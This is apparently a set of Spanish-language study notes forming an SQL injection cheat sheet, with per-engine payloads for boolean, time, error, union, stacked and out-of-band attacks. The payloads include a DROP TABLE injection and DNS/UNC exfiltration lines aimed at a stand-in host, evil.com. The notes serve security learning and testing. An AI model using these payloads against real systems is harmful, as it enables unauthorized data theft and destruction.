--------
Tags: #Sql #Postgres #mysql #database #inyección #injection #explotación #Exploitation #blind #herramientas #tools 

-----
# Definición

>La inyección SQL, también conocida como SQLi, es un tipo de ciberataque en el que un atacante inyecta código SQL malicioso en una aplicación web para manipular una base de datos y acceder a información confidencial. Este tipo de ataque se basa en la introducción de comandos SQL en un sitio web, lo que permite a los hackers obtener acceso no autorizado a datos sensibles.

--------
# Parámetros y Usos

## 🔍 Tipos de ataques SQLi

|Tipo de Ataque|Explicación simple 🧾|¿Qué se logra? 🎯|
|---|---|---|
|**Inyección clásica**|Inserción directa de SQL en un parámetro visible.|Acceso a datos visibles.|
|**Blind SQLi (Boolean)**|No hay mensajes de error, pero cambia la respuesta según el resultado.|Confirmar condiciones (sí/no).|
|**Blind SQLi (Time)**|No hay mensajes visibles, pero la respuesta se retrasa si es verdadera.|Extraer datos poco a poco con tiempo.|
|**Error-Based**|El error de la BD revela información (columna, tabla, etc.).|Extraer info visible desde mensajes de error.|
|**Union-Based**|Se combinan dos consultas para mostrar información extra.|Ver resultados de otras tablas.|
|**Stacked Queries**|Se ejecutan varias consultas a la vez.|Usado en Blind para forzar acciones.|
|**Out-of-band (OOB)**|Extrae datos por DNS, HTTP u otro canal externo.|Extraer datos en entornos muy restringidos.|

---

## 🧪 Lenguaje SQL por Motor de Base de Datos

|Función / Acción|MySQL|PostgreSQL|Microsoft SQL Server|Oracle DB|
|---|---|---|---|---|
|**Concatenar texto**|`'a' 'b'`, `CONCAT('a','b')`|`'a'||'b'`|
|**Subcadena**|`SUBSTRING('abc',1,2)`|`SUBSTRING()`|`SUBSTRING()`|`SUBSTR()`|
|**Comentarios**|`--` , `#`, `/* */`|`--`, `/* */`|`--`, `/* */`|`--`, `/* */`|
|**Versión de BD**|`SELECT @@version`|`SELECT version()`|`SELECT @@version`|`SELECT banner FROM v$version`|
|**Listar tablas**|`SELECT * FROM information_schema.tables`|`SELECT * FROM information_schema.tables`|Igual que PostgreSQL|`SELECT * FROM all_tables`|
|**Columnas**|`information_schema.columns`|`information_schema.columns`|`information_schema.columns`|`all_tab_columns`|

---
## 🧱 Comentarios por Motor

|Motor|Comentario estilo SQL|
|---|---|
|MySQL|`--` (con espacio), `#`, `/* */`|
|PostgreSQL|`--`, `/* */`|
|MSSQL|`--`, `/* */`|
|Oracle|`--`, `/* */`|

---
## 🧰 Parámetros útiles para pruebas manuales

|Acción|Ejemplo|
|---|---|
|Ver versión|`SELECT @@version` / `SELECT version()`|
|Saber el usuario actual|`SELECT user()`|
|Listar bases de datos|`SELECT schema_name FROM information_schema.schemata`|
|Listar tablas de una BD|`SELECT table_name FROM information_schema.tables WHERE table_schema='db'`|
|Ver columnas de una tabla|`SELECT column_name FROM information_schema.columns WHERE table_name='users'`|
## 🧪 Tipos de SQLi: Sintaxis y metodología por motor

---

### 1️⃣ Inyección Clásica (Visible/Error-Based)

#### 🧠 Metodología

> [!info] ¿En qué consiste?  
> Se inserta SQL directamente en campos visibles (GET/POST/cookies) para alterar la lógica de la consulta. Es el tipo más directo y evidente.

---

#### 🧩 Sintaxis por SGBD

|Motor|Ejemplo clásico|
|---|---|
|**MySQL**|`1' OR 1=1--`|
|**PostgreSQL**|`1' OR '1'='1'--`|
|**MSSQL**|`1' OR 1=1--`|
|**Oracle**|`1' OR 'a'='a'--`|

---

#### 🧰 arámetros útiles

| Consulta           | Ejemplo                                                       |
| ------------------ | ------------------------------------------------------------- |
| Usuario actual     | `SELECT user()`                                               |
| Versión de BD      | `SELECT @@version` (MySQL)<br>`SELECT version()` (PostgreSQL) |
| Tablas disponibles | `SELECT * FROM information_schema.tables`                     |

---

> [!example]+  
> 💥 Ejemplo real (GET)
> 
> `http://victima.com/item.php?id=1' OR 1=1--`

---
### 2️⃣ Blind SQLi (Boolean-Based)

#### 🧠 Metodología

> [!info] ¿En qué consiste?  
> No se muestran errores. El atacante modifica la lógica con condiciones booleanas (`TRUE`/`FALSE`) y observa cambios en el comportamiento de la respuesta (contenido, redirección, código HTTP).

---
#### 🧩 Sintaxis por SGBD

|Motor|TRUE|FALSE|
|---|---|---|
|**MySQL**|`' AND 1=1--`|`' AND 1=2--`|
|**PostgreSQL**|`' AND 1=1--`|`' AND 1=2--`|
|**MSSQL**|`' AND 1=1--`|`' AND 1=2--`|
|**Oracle**|`' AND 'a'='a'--`|`' AND 'a'='b'--`|

---

> [!example]+  
> 🔍 Prueba de condición
> 
> `' AND SUBSTRING((SELECT user()),1,1) = 'r'--`

---

### 3️⃣ Blind SQLi (Time-Based)

#### 🧠 Metodología

> [!info] ¿En qué consiste?  
> Si no hay errores ni cambios visibles, se prueba con funciones que **retrasan la respuesta** al evaluar una condición. Se usa para extraer datos bit a bit.

---

#### 🧩 Sintaxis por SGBD

| Motor          | Condición verdadera (retraso)                                                          |
| -------------- | -------------------------------------------------------------------------------------- |
| **MySQL**      | `' AND IF(1=1, SLEEP(5), 0)--`                                                         |
| **PostgreSQL** | `' AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`                        |
| **MSSQL**      | `'; IF (1=1) WAITFOR DELAY '0:0:5'--`                                                  |
| **Oracle**     | `SELECT CASE WHEN (1=1) THEN dbms_pipe.receive_message('a',5) ELSE NULL END FROM dual` |

---

> [!example]+  
> ⏳ Extracción por tiempo
> 
> `' AND IF(SUBSTRING((SELECT database()),1,1)='m', SLEEP(5), 0)--` 

---

### 4️⃣ Error-Based SQLi

#### 🧠 Metodología

> [!info] ¿En qué consiste?  
> Se fuerza un error deliberadamente que **revele datos** dentro del mensaje de error.

---

#### 🧩 Sintaxis por SGBD

|Motor|Técnica|
|---|---|
|**MySQL**|`SELECT EXTRACTVALUE(1, CONCAT(0x5c, (SELECT database())))`|
|**PostgreSQL**|`SELECT CAST((SELECT password FROM users LIMIT 1) AS int)`|
|**MSSQL**|`SELECT 1/0`|
|**Oracle**|`SELECT TO_CHAR(1/0) FROM dual`|

---

> [!example]+  
> 💥 Forzar error con contenido
> 
> `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)`
> 
> 

---

### 5️⃣ Union-Based SQLi

#### 🧠 Metodología

> [!info] ¿En qué consiste?  
> Se usa `UNION SELECT` para combinar la consulta legítima con otra que extrae información de interés, mostrando los resultados en la misma página.

---

#### 🧩 Sintaxis por SGBD

|Motor|Ejemplo|
|---|---|
|**MySQL**|`' UNION SELECT null, user(), null--`|
|**PostgreSQL**|`' UNION SELECT null, version(), null--`|
|**MSSQL**|`' UNION SELECT null, @@version, null--`|
|**Oracle**|`' UNION SELECT null, banner FROM v$version--`|

---

#### 🧰 Pasos comunes

1. Detectar número de columnas con `ORDER BY`.
    
2. Usar `UNION SELECT` con mismo número de columnas.
    
3. Extraer información usando funciones de interés.
    

---

> [!example]+  
> 🎯 Union SELECT
> 
> `' UNION SELECT null, database(), null--`

---

### 6️⃣ Stacked Queries (Multi-consulta)

#### 🧠 Metodología

> [!info] ¿En qué consiste?  
> Permite ejecutar **múltiples sentencias** SQL separadas por `;`. Útil para ataques ciegos, inserciones forzadas o exfiltración.

---

#### 🧩 Sintaxis por SGBD

|Motor|Sintaxis|
|---|---|
|**MySQL**|`1'; DROP TABLE users--` (solo en algunas APIs)|
|**PostgreSQL**|`1'; SELECT pg_sleep(5);--`|
|**MSSQL**|`1'; WAITFOR DELAY '0:0:5';--`|
|**Oracle**|❌ No soporta múltiples consultas|

> [!warning]  
> ⚠ MySQL por defecto **no permite stacked queries** salvo que la aplicación use APIs vulnerables como `mysqli_multi_query`.

---

### 7️⃣ Out-Of-Band (OOB) Exfiltration

#### 🧠 Metodología

> [!info] ¿En qué consiste?  
> Se usan canales como DNS o HTTP para exfiltrar datos fuera del entorno. Muy útil en entornos sin errores visibles ni tiempo.

---

#### 🧩 Sintaxis por SGBD

|Motor|Sintaxis de exfiltración DNS|
|---|---|
|**MySQL**|`SELECT YOUR-DATA INTO OUTFILE '\\\\evil.com\\leak.txt'`|
|**PostgreSQL**|`COPY (SELECT '') TO PROGRAM 'nslookup your-data.evil.com'`|
|**MSSQL**|`EXEC master..xp_dirtree '\\evil.com\leak'`|
|**Oracle**|`SELECT UTL_INADDR.get_host_address('your-data.evil.com') FROM dual`|

> [!tip]  
> Usa Burp Collaborator para recibir las peticiones DNS/HTTP salientes.

---
# Referencias
Cheat Sheet de Burpsuite: [Enlace](https://portswigger.net/web-security/sql-injection/cheat-sheet)